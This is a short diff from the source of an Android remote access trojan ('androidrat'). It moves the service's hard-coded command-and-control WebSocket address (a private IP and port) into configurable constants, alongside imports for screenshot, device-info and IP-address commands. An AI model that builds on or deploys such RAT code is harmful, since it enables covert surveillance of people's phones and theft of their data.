@@ -24,6 +24,8 @@ import com.nqmgaming.androidrat.command.Battery
 import com.nqmgaming.androidrat.command.DeviceInfo
 import com.nqmgaming.androidrat.command.IpAddress
 import com.nqmgaming.androidrat.command.Screenshot
+import com.nqmgaming.androidrat.core.util.Constant.IP_ADDRESS
+import com.nqmgaming.androidrat.core.util.Constant.PORT
 import com.nqmgaming.androidrat.core.util.MediaProjectionManagerHolder.mediaProjectionData
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -64,7 +66,7 @@ class WebSocketService : Service() {
     }
 
     private fun connectWebSocket() {
-        val request = Request.Builder().url("ws://192.168.29.172:5525").build()
+        val request = Request.Builder().url("ws://${IP_ADDRESS}:${PORT}").build()
         webSocket = client.newWebSocket(request, object : WebSocketListener() {
 
             override fun onOpen(webSocket: WebSocket, response: Response) {
